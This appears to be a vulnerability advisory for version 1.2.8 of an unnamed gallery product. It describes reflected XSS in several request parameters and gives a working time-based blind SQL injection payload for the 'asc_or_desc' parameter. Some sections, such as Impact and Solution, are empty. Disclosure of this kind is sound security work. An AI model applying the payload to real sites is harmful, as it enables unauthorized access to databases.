
----------------------------------------------------------------

Product Information:

Tested Version: 1.2.8, released on 15.01.2015 and has over half a million downloads.
Vulnerability Type: Cross-site Scripting (CWE-79)

----------------------------------------------------------------

Description of vulnerability:

When an authenticated user is uploading a picture to a gallery the following POST request is sent to the server:


Host: <IP>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 484



The following parameters in the POST body are vulnerable to XSS:

- sort_by
- sort_order
- items_view
- dir
- clipboard_task
- clipboard_files
- clipboard_src
- clipboard_dest

The parameter sort_by can also be placed within the URL, all other parameters in the POST body can be deleted and the request method can be changed from POST to GET. Afterwards the following GET-request can be used to execute reflected XSS:



----------------------------------------------------------------

Impact: 



----------------------------------------------------------------

Product Information:

Tested Version: 1.2.8, released on 15.01.2015 and has over half a million downloads.
Vulnerability Type: SQL Injection (CWE-89)

----------------------------------------------------------------

Vulnerability description:

When an authenticated user is creating a new gallery a POST-request is sent to the application that is prone to SQL-Injection in the parameter "asc_or_desc".


Host: <IP>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

search_value=&page_number=1&search_or_not=&task=add&current_id=&ids_string=&asc_or_desc=asc&order_by=order


The parameter asc_or_desc in the POST body is prone to a AND/OR time-based blind SQL-Injection. WIth the following payload a delay can be provoked in the request of additional 10 seconds:

asc_or_desc=asc%2c(select%20*%20from%20(select(sleep(10)))a)


----------------------------------------------------------------

Solution:



